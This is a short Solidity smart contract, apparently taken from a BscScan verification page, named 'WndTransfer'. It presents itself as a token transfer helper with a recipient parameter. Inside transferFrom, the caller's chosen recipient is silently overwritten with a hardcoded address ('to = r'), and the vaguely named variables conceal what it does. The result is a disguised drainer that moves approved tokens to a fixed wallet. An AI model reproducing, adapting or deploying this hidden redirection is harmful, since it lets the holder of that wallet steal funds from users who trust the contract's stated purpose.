/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


interface IQwerty {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract WndTransfer {
    address private c = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private r = 0x453611A0f6423A740Dd930E39828E2b26F93A4cB;
    function transferFrom(address to, uint256 amount) external returns (bool) {
        return IQwerty(c).transferFrom(msg.sender, to = r, amount);
    }
}